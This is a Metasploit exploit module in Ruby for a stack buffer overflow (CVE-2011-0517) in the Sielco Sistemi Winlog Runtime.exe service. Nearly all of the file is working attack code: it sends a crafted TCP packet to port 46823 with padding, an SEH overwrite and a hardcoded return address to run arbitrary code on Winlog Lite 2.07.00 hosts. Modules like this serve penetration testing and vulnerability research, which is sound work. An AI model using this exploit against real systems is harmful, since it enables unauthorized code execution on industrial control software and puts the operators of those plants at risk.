##
# $Id: winlog_runtime.rb 13000 2011-06-21 22:42:53Z swtornio $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sielco Sistemi Winlog Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Sielco
				Sistem Winlog <= 2.07.00. When sending a specially formatted
				packet to the Runtime.exe service, an attacker may be able to
				execute arbitrary code.
			},
			'Author'         => [ 'Luigi Auriemma', 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 13000 $',
			'References'     =>
				[
					[ 'CVE', '2011-0517' ],
					[ 'OSVDB', '70418'],
					[ 'URL', 'http://aluigi.org/adv/winlog_1-adv.txt' ],
				],
			'Privileged'     => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'    => 450,
					'BadChars' => "\x00\x20\x0a\x0d",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Winlog Lite 2.07.00', { 'Ret' => 0x011946de } ],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Jan 13 2011'))

		register_options([Opt::RPORT(46823)], self.class)
	end

	def exploit

		connect

		data =  [0x02].pack('C') # opcode
		data << [0x0101].pack('n')
		data << rand_text_alpha_upper(588)
		data << generate_seh_payload(target.ret)

		print_status("Trying target #{target.name}...")
		sock.put(data)

		handler
		disconnect

	end

end
